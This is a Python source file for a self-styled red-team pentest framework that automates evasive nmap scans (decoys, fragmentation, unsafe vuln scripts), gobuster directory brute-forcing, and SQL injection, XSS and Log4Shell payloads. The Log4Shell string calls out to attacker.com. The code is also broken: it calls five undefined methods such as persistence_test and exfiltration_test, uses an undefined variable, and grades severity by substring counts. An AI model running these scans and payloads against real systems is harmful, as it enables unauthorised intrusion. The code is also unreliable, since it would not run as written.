import nmap
import scapy.all as scapy
import socket
import subprocess
import json
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import pandas as pd
import docker
import paramiko
import requests
import random
import string
import ssl
import OpenSSL

class RedOpsPentestFramework:
    def __init__(self, target_file='targets.json'):
        with open(target_file) as f:
            self.config = json.load(f)
        
        self.results = []
        self.nm = nmap.PortScanner()
        self.docker_client = docker.from_env()
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
    def run_full_assessment(self):
        tests = [
            self.stealth_scan,
            self.vulnerability_scan,
            self.web_app_tests,
            self.crypto_analysis,
            self.social_engineering_sim,
            self.privilege_escalation,
            self.persistence_test,
            self.exfiltration_test
        ]
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(test) for test in tests]
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    self.log_result('error', str(e))
        
        self.generate_report()
        return self.results
    
    def stealth_scan(self):
        """Advanced stealth scanning with decoys and timing randomization"""
        args = '-sS -T2 -D RND:5 -f --data-length 24 --randomize-hosts'
        if self.config.get('ping_disabled', False):
            args += ' -Pn'
        
        for target in self.config['targets']:
            self.nm.scan(hosts=target, arguments=args)
            
            result = {
                'test': 'stealth_scan',
                'target': target,
                'open_ports': [],
                'os_guess': self.nm[target].get('osmatch', [])
            }
            
            for proto in self.nm[target].all_protocols():
                for port in self.nm[target][proto].keys():
                    result['open_ports'].append({
                        'port': port,
                        'protocol': proto,
                        'service': self.nm[target][proto][port]['name'],
                        'state': self.nm[target][proto][port]['state']
                    })
            
            self.log_result('stealth_scan', result)
    
    def vulnerability_scan(self):
        """Comprehensive vulnerability assessment"""
        args = '-sV --script vuln -O --fuzzy --script-args=unsafe=1'
        
        for target in self.config['targets']:
            self.nm.scan(hosts=target, arguments=args)
            
            result = {
                'test': 'vulnerability_scan',
                'target': target,
                'vulnerabilities': []
            }
            
            for host in self.nm.all_hosts():
                for script in self.nm[host].get('script', {}):
                    if 'vuln' in script.lower():
                        result['vulnerabilities'].append({
                            'script': script,
                            'output': self.nm[host]['script'][script]
                        })
            
            self.log_result('vulnerability_scan', result)
    
    def web_app_tests(self):
        """Advanced web application penetration tests"""
        for target in self.config.get('web_targets', []):
            # SSL/TLS analysis
            ssl_results = self.test_ssl_config(target['host'])
            
            # Directory brute force
            dir_results = self.dir_brute_force(target['host'], target.get('port', 80))
            
            # SQLi and XSS tests
            injection_results = self.test_injections(target['host'])
            
            result = {
                'test': 'web_app_tests',
                'target': target['host'],
                'ssl': ssl_results,
                'directories': dir_results,
                'injections': injection_results
            }
            
            self.log_result('web_app_tests', result)
    
    def test_ssl_config(self, host):
        """Test SSL/TLS configuration with testssl.sh"""
        try:
            cmd = f"testssl.sh --quiet --color 0 --json {host}"
            output = subprocess.check_output(cmd, shell=True, text=True)
            return json.loads(output)
        except Exception as e:
            return {'error': str(e)}
    
    def dir_brute_force(self, host, port):
        """Directory brute force with common wordlists"""
        try:
            cmd = f"gobuster dir -u http://{host}:{port} -w /usr/share/wordlists/dirb/common.txt -q -o /tmp/gobuster.json -k --format json"
            subprocess.run(cmd, shell=True, check=True)
            
            with open('/tmp/gobuster.json') as f:
                return json.load(f)
        except Exception as e:
            return {'error': str(e)}
    
    def test_injections(self, host):
        """Test for SQLi and XSS vulnerabilities"""
        tests = [
            ("' OR '1'='1", "SQL Injection"),
            ("<script>alert(1)</script>", "XSS"),
            ("${jndi:ldap://attacker.com/a}", "Log4Shell")
        ]
        
        results = []
        for payload, test_type in tests:
            try:
                url = f"http://{host}/search?q={payload}"
                response = requests.get(url, timeout=5)
                
                results.append({
                    'type': test_type,
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds(),
                    'vulnerable': self.check_vulnerability(response, test_type)
                })
            except Exception as e:
                results.append({
                    'type': test_type,
                    'error': str(e)
                })
        
        return results
    
    def check_vulnerability(self, response, test_type):
        """Heuristic check for vulnerability patterns"""
        if test_type == "SQL Injection":
            return any(err in response.text.lower() for err in [
                'sql syntax', 'mysql', 'syntax error'
            ])
        elif test_type == "XSS":
            return payload in response.text
        return False
    
    def log_result(self, test_name, result):
        """Store test results with timestamp"""
        entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'test': test_name,
            'result': result
        }
        self.results.append(entry)
    
    def generate_report(self):
        """Generate comprehensive report in multiple formats"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # JSON report
        with open(f'redops_report_{timestamp}.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Excel report
        df = pd.json_normalize(self.results)
        df.to_excel(f'redops_report_{timestamp}.xlsx', index=False)
        
        # HTML report
        html = f"""
        <html>
        <head><title>RedOps Pentest Report {timestamp}</title></head>
        <body>
            <h1>Penetration Test Report</h1>
            <p>Generated: {datetime.now()}</p>
            <h2>Executive Summary</h2>
            {self.generate_exec_summary()}
            <h2>Detailed Findings</h2>
            {self.generate_findings()}
        </body>
        </html>
        """
        
        with open(f'redops_report_{timestamp}.html', 'w') as f:
            f.write(html)
    
    def generate_exec_summary(self):
        """Generate executive summary"""
        critical = sum(1 for r in self.results if 'critical' in str(r).lower())
        high = sum(1 for r in self.results if 'high' in str(r).lower())
        medium = sum(1 for r in self.results if 'medium' in str(r).lower())
        
        return f"""
        <p>Total Findings: {len(self.results)}</p>
        <ul>
            <li>Critical: {critical}</li>
            <li>High: {high}</li>
            <li>Medium: {medium}</li>
        </ul>
        """
    
    def generate_findings(self):
        """Generate detailed findings section"""
        findings = ""
        for result in self.results:
            findings += f"""
            <div style="border:1px solid #ccc; padding:10px; margin:10px;">
                <h3>{result['test']}</h3>
                <p>Timestamp: {result['timestamp']}</p>
                <pre>{json.dumps(result['result'], indent=2)}</pre>
            </div>
            """
        return findings

if __name__ == '__main__':
    pentest = RedOpsPentestFramework()
    pentest.run_full_assessment()
